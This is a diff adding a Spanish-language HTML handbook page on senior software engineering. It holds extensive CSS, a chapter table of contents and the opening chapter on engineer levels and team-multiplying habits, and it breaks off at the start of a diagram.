@@ -1,0 +1,3897 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Software Engineering — Handbook Senior</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Fira+Code:wght@400;500&family=Source+Sans+3:ital,wght@0,300;0,400;0,600;1,400&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #faf8f4;
+            --bg2: #f3f0ea;
+            --bg3: #ece8e0;
+            --bg4: #e4dfd4;
+            --dark: #c3b3a3;
+            --dark2: #252018;
+            --border: #525151;
+            --border2: #c8c0b0;
+            --text: #000000;
+            --mid: #5a5248;
+            --dim: #8a8278;
+            --bright: #1a1612;
+            --red: #b83232;
+            --green: #2a6a3a;
+            --blue: #1a4a7a;
+            --orange: #b85a1a;
+            --purple: #6a3a8a;
+            --teal: #1a6a6a;
+            --gold: #8a6a10;
+            --code-bg: #1e1c18;
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        html {
+            scroll-behavior: smooth
+        }
+
+        body {
+            font-family: 'Source Sans 3', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            font-size: 15.5px;
+            line-height: 1.85
+        }
+
+        ::-webkit-scrollbar {
+            width: 5px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg2)
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border2);
+            border-radius: 3px
+        }
+
+        .layout {
+            display: flex;
+            min-height: 100vh
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            width: 285px;
+            min-width: 285px;
+            background: var(--dark);
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            padding-bottom: 3rem;
+            border-right: 1px solid #2e2a22
+        }
+
+        .sidebar::-webkit-scrollbar-track {
+            background: var(--dark)
+        }
+
+        .sidebar::-webkit-scrollbar-thumb {
+            background: #3a3530
+        }
+
+        .sb-logo {
+            padding: 1.75rem 1.5rem 1.25rem;
+            border-bottom: 1px solid #2e2a22
+        }
+
+        .sb-logo .ey {
+            font-family: 'Fira Code', monospace;
+            font-size: 9px;
+            letter-spacing: .2em;
+            text-transform: uppercase;
+            color: var(--orange);
+            display: block;
+            margin-bottom: .4rem
+        }
+
+        .sb-logo h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 15px;
+            font-weight: 600;
+            color: #e8e0d0;
+            line-height: 1.3
+        }
+
+        .tg {
+            padding: .4rem 0
+        }
+
+        .tl {
+            font-family: 'Fira Code', monospace;
+            font-size: 9px;
+            letter-spacing: .15em;
+            text-transform: uppercase;
+            color: #3a3530;
+            padding: .85rem 1.5rem .3rem;
+            display: block
+        }
+
+        .toc-link {
+            display: block;
+            padding: .3rem 1.5rem;
+            font-size: 12.5px;
+            color: #5a5248;
+            text-decoration: none;
+            transition: all .12s;
+            border-left: 2px solid transparent
+        }
+
+        .toc-link:hover {
+            color: #e8e0d0;
+            background: rgba(184, 90, 26, .06);
+            border-left-color: var(--orange)
+        }
+
+        .toc-sub {
+            padding-left: 2.5rem;
+            font-size: 11.5px;
+            color: #2e2a22
+        }
+
+        .toc-sub:hover {
+            color: #8a8278
+        }
+
+        /* HERO */
+        .hero {
+            background: var(--dark);
+            color: #e8e0d0;
+            padding: 5rem 4.5rem 4rem;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 3px solid var(--orange)
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse 70% 100% at 95% 50%, rgba(184, 90, 26, .07) 0%, transparent 60%), radial-gradient(ellipse 40% 60% at 5% 90%, rgba(42, 106, 58, .04) 0%, transparent 50%)
+        }
+
+        .hero-ey {
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            letter-spacing: .2em;
+            text-transform: uppercase;
+            color: var(--orange);
+            display: flex;
+            align-items: center;
+            gap: .75rem;
+            margin-bottom: 1.5rem;
+            position: relative
+        }
+
+        .hero-ey::before {
+            content: '';
+            width: 32px;
+            height: 1px;
+            background: var(--orange)
+        }
+
+        .hero h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: clamp(2.2rem, 3.8vw, 4rem);
+            font-weight: 700;
+            color: #f0e8d8;
+            line-height: 1.08;
+            max-width: 740px;
+            margin-bottom: 1.5rem;
+            position: relative
+        }
+
+        .hero h1 em {
+            font-style: italic;
+            color: #d4905a
+        }
+
+        .hero-sub {
+            font-size: 15px;
+            color: #6a6258;
+            max-width: 600px;
+            line-height: 1.8;
+            position: relative
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 2.5rem;
+            margin-top: 2.75rem;
+            padding-top: 2rem;
+            border-top: 1px solid #2e2a22;
+            position: relative;
+            flex-wrap: wrap
+        }
+
+        .stat {
+            display: flex;
+            flex-direction: column;
+            gap: .15rem
+        }
+
+        .stat-n {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #f0e8d8;
+            line-height: 1
+        }
+
+        .stat-l {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            color: #3a3530;
+            letter-spacing: .05em
+        }
+
+        /* CONTENT */
+        .content {
+            padding: 4rem 4.5rem 8rem;
+            max-width: 990px
+        }
+
+        /* CHAPTERS */
+        .chapter {
+            margin-bottom: 5.5rem;
+            scroll-margin-top: 2rem
+        }
+
+        .ch-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 1.5rem;
+            margin-bottom: 2.75rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px solid var(--border)
+        }
+
+        .ch-badge {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            letter-spacing: .1em;
+            padding: .3rem .75rem;
+            background: var(--dark);
+            color: var(--orange);
+            border-radius: 3px;
+            white-space: nowrap;
+            margin-top: .5rem;
+            flex-shrink: 0
+        }
+
+        .ch-header h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.1rem;
+            font-weight: 700;
+            color: var(--bright);
+            line-height: 1.1
+        }
+
+        h3 {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--bright);
+            margin: 2.75rem 0 .9rem;
+            padding-left: 1rem;
+            border-left: 3px solid var(--green)
+        }
+
+        h4 {
+            font-family: 'Fira Code', monospace;
+            font-size: 10.5px;
+            letter-spacing: .12em;
+            text-transform: uppercase;
+            color: var(--blue);
+            margin: 2rem 0 .6rem
+        }
+
+        h5 {
+            font-size: 14.5px;
+            font-weight: 600;
+            color: var(--bright);
+            margin: 1.25rem 0 .4rem
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--mid)
+        }
+
+        strong {
+            color: var(--bright);
+            font-weight: 600
+        }
+
+        em {
+            font-style: italic;
+            color: var(--bright)
+        }
+
+        a {
+            color: var(--blue);
+            text-decoration: none
+        }
+
+        /* TAGS */
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: .4rem;
+            margin: .75rem 0 1.25rem
+        }
+
+        .tag {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            padding: .2rem .6rem;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 2px;
+            color: var(--dim)
+        }
+
+        .tag.rd {
+            background: rgba(184, 50, 50, .07);
+            border-color: rgba(184, 50, 50, .25);
+            color: var(--red)
+        }
+
+        .tag.gn {
+            background: rgba(42, 106, 58, .07);
+            border-color: rgba(42, 106, 58, .25);
+            color: var(--green)
+        }
+
+        .tag.bl {
+            background: rgba(26, 74, 122, .07);
+            border-color: rgba(26, 74, 122, .25);
+            color: var(--blue)
+        }
+
+        .tag.or {
+            background: rgba(184, 90, 26, .07);
+            border-color: rgba(184, 90, 26, .25);
+            color: var(--orange)
+        }
+
+        .tag.vl {
+            background: rgba(106, 58, 138, .07);
+            border-color: rgba(106, 58, 138, .25);
+            color: var(--purple)
+        }
+
+        .tag.tl {
+            background: rgba(26, 106, 106, .07);
+            border-color: rgba(26, 106, 106, .25);
+            color: var(--teal)
+        }
+
+        /* CARDS */
+        .cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(265px, 1fr));
+            gap: .9rem;
+            margin: 1.5rem 0
+        }
+
+        .card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.2rem 1.4rem;
+            transition: border-color .15s
+        }
+
+        .card:hover {
+            border-color: var(--border2)
+        }
+
+        .card-title {
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--bright);
+            margin-bottom: .45rem;
+            display: flex;
+            align-items: center;
+            gap: .5rem
+        }
+
+        .card p {
+            font-size: 13px;
+            margin: 0;
+            color: var(--dim)
+        }
+
+        .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            flex-shrink: 0
+        }
+
+        .d-rd {
+            background: var(--red)
+        }
+
+        .d-gn {
+            background: var(--green)
+        }
+
+        .d-bl {
+            background: var(--blue)
+        }
+
+        .d-or {
+            background: var(--orange)
+        }
+
+        .d-vl {
+            background: var(--purple)
+        }
+
+        .d-tl {
+            background: var(--teal)
+        }
+
+        /* PROS/CONS */
+        .pros-cons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.5rem 0
+        }
+
+        .pros,
+        .cons {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.1rem 1.3rem
+        }
+
+        .pros {
+            border-top: 2px solid var(--green)
+        }
+
+        .cons {
+            border-top: 2px solid var(--red)
+        }
+
+        .pros h4 {
+            color: var(--green);
+            margin: 0 0 .7rem
+        }
+
+        .cons h4 {
+            color: var(--red);
+            margin: 0 0 .7rem
+        }
+
+        .pros ul,
+        .cons ul {
+            list-style: none;
+            padding: 0
+        }
+
+        .pros li,
+        .cons li {
+            font-size: 13px;
+            padding: .22rem 0;
+            color: var(--mid);
+            padding-left: 1.2em;
+            position: relative
+        }
+
+        .pros li::before {
+            content: '+';
+            position: absolute;
+            left: 0;
+            color: var(--green);
+            font-weight: 700
+        }
+
+        .cons li::before {
+            content: '−';
+            position: absolute;
+            left: 0;
+            color: var(--red);
+            font-weight: 700
+        }
+
+        /* WHEN BOX */
+        .when-box {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.5rem 0
+        }
+
+        .when-use,
+        .when-avoid {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.1rem 1.3rem;
+            background: var(--bg2)
+        }
+
+        .when-use {
+            border-left: 3px solid var(--green)
+        }
+
+        .when-avoid {
+            border-left: 3px solid var(--orange)
+        }
+
+        .wl {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            letter-spacing: .12em;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: .6rem
+        }
+
+        .when-use .wl {
+            color: var(--green)
+        }
+
+        .when-avoid .wl {
+            color: var(--orange)
+        }
+
+        .when-use ul,
+        .when-avoid ul {
+            list-style: none;
+            padding: 0
+        }
+
+        .when-use li,
+        .when-avoid li {
+            font-size: 13px;
+            color: var(--mid);
+            padding: .2rem 0;
+            padding-left: 1.1em;
+            position: relative
+        }
+
+        .when-use li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: var(--green)
+        }
+
+        .when-avoid li::before {
+            content: '✗';
+            position: absolute;
+            left: 0;
+            color: var(--orange)
+        }
+
+        /* CODE */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid #2e2a22;
+            border-radius: 6px;
+            padding: 1.3rem 1.5rem;
+            overflow-x: auto;
+            margin: 1.3rem 0;
+            position: relative
+        }
+
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: .5rem;
+            right: .8rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 9px;
+            color: #3a3530;
+            letter-spacing: .1em;
+            text-transform: uppercase
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 12.5px;
+            color: #a8b8a0;
+            line-height: 1.7
+        }
+
+        :not(pre)>code {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 3px;
+            padding: .1em .45em;
+            font-size: 12px;
+            color: var(--teal);
+            font-family: 'Fira Code', monospace
+        }
+
+        .cm {
+            color: #3a3a2a
+        }
+
+        .kw {
+            color: #c07840
+        }
+
+        .str {
+            color: #7ab880
+        }
+
+        .fn {
+            color: #80a8c8
+        }
+
+        .nm {
+            color: #c8a870
+        }
+
+        .k2 {
+            color: #b870c0
+        }
+
+        .op {
+            color: #c8c080
+        }
+
+        /* DIAGRAM */
+        .diagram {
+            background: var(--code-bg);
+            border: 1px solid #2e2a22;
+            border-left: 3px solid var(--purple);
+            border-radius: 6px;
+            padding: 1.3rem 1.5rem;
+            margin: 1.3rem 0;
+            overflow-x: auto
+        }
+
+        .diagram pre {
+            background: none;
+            border: none;
+            padding: 0;
+            margin: 0;
+            border-radius: 0
+        }
+
+        .diagram pre::before {
+            display: none
+        }
+
+        .diagram code {
+            color: #5a7a6a;
+            font-size: 12px
+        }
+
+        /* TABLES */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 1.5rem 0
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13.5px
+        }
+
+        thead tr {
+            background: var(--bg3)
+        }
+
+        th {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            letter-spacing: .08em;
+            text-transform: uppercase;
+            color: var(--dim);
+            padding: .75rem 1rem;
+            text-align: left;
+            border-bottom: 2px solid var(--border2);
+            white-space: nowrap
+        }
+
+        td {
+            padding: .65rem 1rem;
+            border-bottom: 1px solid var(--border);
+            color: var(--mid);
+            vertical-align: top
+        }
+
+        tr:last-child td {
+            border-bottom: none
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 0, 0, .02)
+        }
+
+        td.g {
+            color: var(--green);
+            font-weight: 600
+        }
+
+        td.r {
+            color: var(--red);
+            font-weight: 600
+        }
+
+        td.b {
+            color: var(--blue);
+            font-weight: 600
+        }
+
+        td.y {
+            color: var(--gold);
+            font-weight: 600
+        }
+
+        td.v {
+            color: var(--purple);
+            font-weight: 600
+        }
+
+        td.t {
+            color: var(--teal);
+            font-weight: 600
+        }
+
+        /* CALLOUTS */
+        .callout {
+            border-radius: 6px;
+            padding: 1rem 1.2rem;
+            margin: 1.3rem 0;
+            border: 1px solid;
+            display: flex;
+            gap: .85rem;
+            align-items: flex-start
+        }
+
+        .callout-icon {
+            font-size: 1rem;
+            flex-shrink: 0;
+            line-height: 1.85
+        }
+
+        .callout p {
+            margin: 0;
+            font-size: 13.5px
+        }
+
+        .callout.info {
+            border-color: rgba(26, 74, 122, .25);
+            background: rgba(26, 74, 122, .05)
+        }
+
+        .callout.warn {
+            border-color: rgba(138, 106, 16, .3);
+            background: rgba(138, 106, 16, .05)
+        }
+
+        .callout.danger {
+            border-color: rgba(184, 50, 50, .25);
+            background: rgba(184, 50, 50, .05)
+        }
+
+        .callout.tip {
+            border-color: rgba(42, 106, 58, .25);
+            background: rgba(42, 106, 58, .05)
+        }
+
+        .callout.axiom {
+            border-color: rgba(106, 58, 138, .25);
+            background: rgba(106, 58, 138, .05)
+        }
+
+        .callout.info .callout-icon::before {
+            content: 'ℹ';
+            color: var(--blue)
+        }
+
+        .callout.warn .callout-icon::before {
+            content: '⚑';
+            color: var(--gold)
+        }
+
+        .callout.danger .callout-icon::before {
+            content: '⚠';
+            color: var(--red)
+        }
+
+        .callout.tip .callout-icon::before {
+            content: '→';
+            color: var(--green)
+        }
+
+        .callout.axiom .callout-icon::before {
+            content: '◆';
+            color: var(--purple)
+        }
+
+        /* CASE STUDY */
+        .case-study {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.6rem;
+            margin: 1.5rem 0
+        }
+
+        .cs-h {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap
+        }
+
+        .cs-badge {
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            font-weight: 500;
+            padding: .3rem .85rem;
+            border-radius: 3px;
+            background: var(--dark);
+            border: 1px solid #3a3530;
+            color: #e8e0d0
+        }
+
+        .cs-h h4 {
+            font-family: 'Source Sans 3', sans-serif;
+            font-size: 14px;
+            color: var(--bright);
+            font-weight: 600;
+            margin: 0;
+            letter-spacing: normal;
+            text-transform: none
+        }
+
+        .case-study p {
+            font-size: 13.5px
+        }
+
+        /* ARCH RELATION */
+        .arch-rel {
+            background: var(--bg3);
+            border: 1px solid var(--border2);
+            border-radius: 6px;
+            padding: .95rem 1.25rem;
+            margin: 1.3rem 0;
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start
+        }
+
+        .arch-rel-lbl {
+            font-family: 'Fira Code', monospace;
+            font-size: 9.5px;
+            color: var(--purple);
+            letter-spacing: .1em;
+            text-transform: uppercase;
+            white-space: nowrap;
+            padding-top: .15rem;
+            flex-shrink: 0
+        }
+
+        .arch-rel p {
+            margin: 0;
+            font-size: 13px;
+            color: var(--mid)
+        }
+
+        /* COMPARE */
+        .compare-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.3rem 0
+        }
+
+        .compare-col {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.2rem
+        }
+
+        .compare-col h4 {
+            font-family: 'Source Sans 3', sans-serif;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--bright);
+            margin: 0 0 .8rem;
+            text-transform: none;
+            letter-spacing: normal;
+            padding-bottom: .65rem;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .compare-col ul {
+            list-style: none;
+            padding: 0
+        }
+
+        .compare-col li {
+            font-size: 13px;
+            color: var(--mid);
+            padding: .25rem 0;
+            border-bottom: 1px dotted var(--border)
+        }
+
+        .compare-col li:last-child {
+            border-bottom: none
+        }
+
+        /* PRINCIPLE GRID */
+        .pgrid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(215px, 1fr));
+            gap: .85rem;
+            margin: 1.3rem 0
+        }
+
+        .pitem {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1rem;
+            background: var(--bg2)
+        }
+
+        .pitem strong {
+            display: block;
+            font-size: 13px;
+            margin-bottom: .35rem;
+            color: var(--purple)
+        }
+
+        .pitem p {
+            font-size: 12.5px;
+            margin: 0;
+            color: var(--dim)
+        }
+
+        hr.div {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2.5rem 0
+        }
+
+        /* LEVEL TABLE */
+        .level-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: .75rem;
+            margin: 1.5rem 0
+        }
+
+        .level-item {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1rem;
+            background: var(--bg2);
+            text-align: center
+        }
+
+        .level-item .lv {
+            font-family: 'Fira Code', monospace;
+            font-size: 9.5px;
+            letter-spacing: .1em;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: .4rem
+        }
+
+        .level-item strong {
+            display: block;
+            font-size: 13px;
+            color: var(--bright);
+            margin-bottom: .3rem
+        }
+
+        .level-item p {
+            font-size: 12px;
+            margin: 0;
+            color: var(--dim)
+        }
+
+        /* FOOTER */
+        .footer {
+            border-top: 2px solid var(--border);
+            padding: 2rem 4.5rem;
+            font-size: 12.5px;
+            color: var(--dim);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--bg2)
+        }
+
+        .footer span {
+            font-family: 'Fira Code', monospace
+        }
+
+        @media(max-width:900px) {
+            .sidebar {
+                display: none
+            }
+
+            .hero,
+            .content {
+                padding-left: 1.5rem;
+                padding-right: 1.5rem
+            }
+
+            .pros-cons,
+            .when-box,
+            .compare-row,
+            .level-grid {
+                grid-template-columns: 1fr 1fr
+            }
+        }
+
+        @media(max-width:600px) {
+            .level-grid {
+                grid-template-columns: 1fr 1fr
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="layout">
+
+        <!-- SIDEBAR -->
+        <nav class="sidebar">
+            <div class="sb-logo">
+                <span class="ey">Handbook Senior</span>
+                <h2>Software Engineering</h2>
+            </div>
+            <div class="tg">
+                <span class="tl">Fundamentos</span>
+                <a class="toc-link" href="#cap01">01 · El Ingeniero Senior</a>
+                <a class="toc-link toc-sub" href="#levels">Junior → Staff</a>
+                <a class="toc-link toc-sub" href="#multiplier">El efecto multiplicador</a>
+                <a class="toc-link" href="#cap02">02 · El Oficio del Código</a>
+                <a class="toc-link toc-sub" href="#naming">Naming & legibilidad</a>
+                <a class="toc-link toc-sub" href="#solid-real">SOLID con profundidad</a>
+                <a class="toc-link toc-sub" href="#tech-debt">Deuda técnica real</a>
+            </div>
+            <div class="tg">
+                <span class="tl">Diseño</span>
+                <a class="toc-link" href="#cap03">03 · Diseño de Software</a>
+                <a class="toc-link toc-sub" href="#patterns">Patrones como soluciones</a>
+                <a class="toc-link toc-sub" href="#api-design">API Design</a>
+                <a class="toc-link toc-sub" href="#abstractions">Abstracciones</a>
+                <a class="toc-link" href="#cap04">04 · Backend Engineering</a>
+                <a class="toc-link toc-sub" href="#http-deep">HTTP profundo</a>
+                <a class="toc-link toc-sub" href="#auth">Auth real</a>
+                <a class="toc-link toc-sub" href="#concurrency">Concurrencia</a>
+            </div>
+            <div class="tg">
+                <span class="tl">Frontend & Datos</span>
+                <a class="toc-link" href="#cap05">05 · Frontend Engineering</a>
+                <a class="toc-link toc-sub" href="#browser">El navegador real</a>
+                <a class="toc-link toc-sub" href="#state">Estado como problema central</a>
+                <a class="toc-link toc-sub" href="#perf-fe">Performance frontend</a>
+                <a class="toc-link" href="#cap06">06 · Bases de Datos</a>
+                <a class="toc-link toc-sub" href="#indexing">Indexing real</a>
+                <a class="toc-link toc-sub" href="#transactions">Transacciones</a>
+                <a class="toc-link toc-sub" href="#migrations">Migraciones</a>
+            </div>
+            <div class="tg">
+                <span class="tl">Calidad & Seguridad</span>
+                <a class="toc-link" href="#cap07">07 · Testing</a>
+                <a class="toc-link toc-sub" href="#test-confidence">Confianza, no coverage</a>
+                <a class="toc-link toc-sub" href="#tdd">TDD como diseño</a>
+                <a class="toc-link" href="#cap08">08 · Performance</a>
+                <a class="toc-link toc-sub" href="#profiling">Profiling primero</a>
+                <a class="toc-link toc-sub" href="#caching">Caching real</a>
+                <a class="toc-link toc-sub" href="#n1">N+1 queries</a>
+                <a class="toc-link" href="#cap09">09 · Seguridad</a>
+                <a class="toc-link toc-sub" href="#owasp">OWASP Top 10</a>
+                <a class="toc-link toc-sub" href="#crypto">Cryptography práctica</a>
+            </div>
+            <div class="tg">
+                <span class="tl">Sistemas & Equipo</span>
+                <a class="toc-link" href="#cap10">10 · Sistemas Distribuidos</a>
+                <a class="toc-link toc-sub" href="#idempotency">Idempotencia</a>
+                <a class="toc-link toc-sub" href="#retry">Retry & Circuit Breaker</a>
+                <a class="toc-link" href="#cap11">11 · El Ingeniero en el Equipo</a>
+                <a class="toc-link toc-sub" href="#code-review">Code reviews reales</a>
+                <a class="toc-link toc-sub" href="#estimations">Estimaciones honestas</a>
+                <a class="toc-link" href="#cap12">12 · Desarrollo Profesional</a>
+                <a class="toc-link" href="#bonus">BONUS · Referencia Rápida</a>
+            </div>
+        </nav>
+
+        <!-- MAIN -->
+        <main style="flex:1;overflow-x:hidden">
+
+            <!-- HERO -->
+            <header class="hero">
+                <div class="hero-ey">Software Engineering</div>
+                <h1>Handbook <em>Senior</em> del<br>Ingeniero de Software</h1>
+                <p class="hero-sub">Todo lo que los tutoriales no enseñan. El oficio real del código, el criterio para
+                    tomar
+                    decisiones técnicas difíciles, y cómo multiplicar el impacto de un equipo completo.</p>
+                <div class="hero-stats">
+                    <div class="stat"><span class="stat-n">12</span><span class="stat-l">Capítulos</span></div>
+                    <div class="stat"><span class="stat-n">60+</span><span class="stat-l">Anti-patterns</span></div>
+                    <div class="stat"><span class="stat-n">40+</span><span class="stat-l">Ejemplos de código real</span>
+                    </div>
+                    <div class="stat"><span class="stat-n">Full</span><span class="stat-l">Stack · Back · Front ·
+                            DB</span></div>
+                </div>
+            </header>
+
+            <div class="content">
+
+                <!-- ════════════════════════════════════════
+     CAP 01: EL INGENIERO SENIOR
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap01">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 01</span>
+                        <h2>Qué es Realmente un Ingeniero Senior</h2>
+                    </div>
+
+                    <p>La definición más común de "senior" en la industria es incorrecta. No es el ingeniero con más
+                        años de
+                        experiencia, ni el que conoce más tecnologías, ni el que escribe el código más sofisticado. Un
+                        ingeniero
+                        senior es el que <strong>multiplica el output del equipo</strong>, convierte la ambigüedad en
+                        claridad
+                        técnica, y reduce activamente la complejidad del sistema.</p>
+
+                    <p>La diferencia entre un junior y un senior no es de conocimiento — es de <em>modelo mental</em>.
+                        El junior
+                        ve un problema técnico. El senior ve el problema técnico, el problema de negocio detrás, las
+                        consecuencias
+                        de las diferentes soluciones en el tiempo, y el impacto en el equipo que lo va a mantener.</p>
+
+                    <div class="callout axiom">
+                        <div class="callout-icon"></div>
+                        <p><strong>Axioma #1:</strong> Un ingeniero senior que hace el trabajo de tres juniors no es
+                            tres veces
+                            mejor — está haciendo algo incorrecto. El leverage real de un senior está en elevar a los
+                            que están
+                            alrededor, no en escribir más código.</p>
+                    </div>
+
+                    <h3 id="levels">La Progresión Real: Junior → Mid → Senior → Staff</h3>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Nivel</th>
+                                    <th>Scope de impacto</th>
+                                    <th>Input necesario</th>
+                                    <th>Output primario</th>
+                                    <th>Lo que los distingue</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="b"><strong>Junior</strong></td>
+                                    <td>Una tarea, un componente</td>
+                                    <td>Instrucciones detalladas, supervisión continua</td>
+                                    <td>Código que funciona según lo especificado</td>
+                                    <td>Aprenden rápido, hacen buenas preguntas</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>Mid</strong></td>
+                                    <td>Una feature completa</td>
+                                    <td>Requerimientos claros, revisión en puntos clave</td>
+                                    <td>Features completas con tests y documentación</td>
+                                    <td>Trabajan de forma independiente, identifican problemas</td>
+                                </tr>
+                                <tr>
+                                    <td class="y"><strong>Senior</strong></td>
+                                    <td>Un dominio o sistema completo</td>
+                                    <td>Objetivos de negocio, sin especificaciones técnicas</td>
+                                    <td>Soluciones técnicas a problemas de negocio</td>
+                                    <td>Multiplican al equipo, toman buenas decisiones de trade-off</td>
+                                </tr>
+                                <tr>
+                                    <td class="v"><strong>Staff</strong></td>
+                                    <td>Múltiples equipos, dirección técnica</td>
+                                    <td>Estrategia de alto nivel</td>
+                                    <td>Visión técnica, estándares, alineación cross-team</td>
+                                    <td>Cambian el rumbo técnico de la organización</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h3 id="multiplier">El Efecto Multiplicador del Senior</h3>
+                    <p>Los seniors más valiosos no son los mejores programadores del equipo. Son los que hacen mejores a
+                        todos los
+                        demás. Esto se manifiesta de formas concretas:</p>
+
+                    <div class="cards">
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Code reviews que enseñan</div>
+                            <p>No solo señalan qué está mal — explican por qué, con alternativas concretas. Un buen code
+                                review
+                                transfiere conocimiento al autor. Una semana de buenos reviews puede acelerar el
+                                crecimiento de un
+                                junior más que un mes de trabajo independiente.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Clarificar antes de codificar</div>
+                            <p>Identifican ambigüedad en los requerimientos antes de escribir una línea. "¿Qué pasa
+                                cuando el usuario
+                                no tiene email?" es una pregunta que ahorra días de re-trabajo. Los juniors implementan
+                                lo que les
+                                dijeron; los seniors preguntan lo que no les dijeron.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Simplificar lo que ya existe</div>
+                            <p>Cada semana eliminan complejidad del sistema: refactorizan código difícil de entender,
+                                eliminar
+                                abstracciones incorrectas, consolidan duplicación. El código que eliminan es la
+                                contribución más valiosa
+                                que nadie ve.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Decir "no sé" estratégicamente</div>
+                            <p>Admiten incertidumbre en lugar de especular. "No sé, pero lo investigo y te digo en 30
+                                minutos"
+                                construye más confianza que una respuesta incorrecta dada con seguridad.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-rd"></span>Anti-pattern: Hero engineer</div>
+                            <p>El senior que resuelve todos los problemas él mismo crea una dependencia del equipo en su
+                                persona, no
+                                transfiere conocimiento, y es un single point of failure. Si el equipo colapsa cuando se
+                                va de
+                                vacaciones, algo está mal.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-rd"></span>Anti-pattern: Complexity as status
+                            </div>
+                            <p>Escribir código sofisticado para demostrar habilidad. La solución más simple que resuelve
+                                el problema
+                                es casi siempre superior. "Si no puedes explicarlo simplemente, no lo entiendes bien." —
+                                Feynman.</p>
+                        </div>
+                    </div>
+
+                    <h3>Cómo se Desarrolla el Criterio Técnico</h3>
+                    <p>El criterio — la capacidad de tomar buenas decisiones técnicas con información incompleta — no
+                        viene de
+                        leer documentación. Viene de un ciclo específico que la mayoría de los ingenieros no hace
+                        conscientemente:
+                    </p>
+
+                    <div class="diagram">
+                        <pre><code>
